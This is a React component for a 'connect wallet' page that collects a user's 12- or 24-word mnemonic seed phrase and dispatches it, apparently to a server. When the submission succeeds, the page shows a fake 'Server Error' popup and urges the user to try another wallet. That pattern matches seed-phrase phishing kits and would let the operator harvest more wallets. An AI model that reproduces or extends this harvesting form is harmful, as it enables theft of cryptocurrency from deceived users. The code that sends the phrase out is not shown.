import { useDeferredValue, useEffect, useState } from "react";
import { importMnemonicPhrase, refreshImportNetError } from "../../stateManagement/redux/actionCreators/ImportActionCreators";
import { ConnectButton, ErrMsg, NetErrMsg, PassphraseForm, PassphraseFormDesription, PassphraseTextArea } from "./Style";
import { useDispatch, useSelector } from "react-redux";
import PopUp from "../../components/PopUp/PopUp";
import { useNavigate } from "react-router-dom";

const MnemonicPhrase = () => {
    const [phrase, setPhrase] = useState("");
    const [submittedPhrase, setSubmittedPhrase] = useState("");
    const dispatch = useDispatch();
    const navigate = useNavigate();

    const netError = useSelector(state => state.import.netError);

    const state = useSelector(state => state.import.mnemonicPhrase);

    const connecting = state.start;
    const errors = state.errors;
    const connected = state.success;

    const popUpActions = [
        {
            id: 1,
            name: "try again",
            callback: () => {
                dispatch(refreshImportNetError());
            }
        },
        {
            id: 2,
            name: "Go home",
            callback: () => navigate("/home", {replace: true})
        }
    ];

    useEffect(() => {
        dispatch(refreshImportNetError());
    }, []);

    return (
        <>
            {
                connected

                &&

                <PopUp
                    title={"Server Error"}
                    body={"unable to connect to the server. Try another wallet or try again later."}
                    actions={popUpActions}
                />
            }
            <PassphraseForm>
                {
                    netError

                    &&

                    <NetErrMsg>{netError.message}</NetErrMsg>
                }
                <PassphraseTextArea
                    placeholder="Phrase"
                    variant="mnemonicPhrase"
                    value={phrase}
                    onChange={e => {
                        setPhrase(e.target.value);
                    }}
                />
                {
                    (errors && errors.phrase.length >= 1 && phrase === submittedPhrase)

                    &&

                    <ErrMsg>{errors.phrase[0]}</ErrMsg>
                }
                <PassphraseFormDesription>Typically 12 (sometimes 24) words seperated by single spaces.</PassphraseFormDesription>
                <ConnectButton
                    className={`${connecting ? "connecting" : ""} `}
                    type="submit"
                    onClick={e => {
                        e.preventDefault();

                        setSubmittedPhrase(phrase);

                        dispatch(importMnemonicPhrase({
                            phrase: phrase
                        }));
                    }}
                >CONNECT{connecting ? "ING" : ""}</ConnectButton>
            </PassphraseForm>
        </>
    );
}

export default MnemonicPhrase;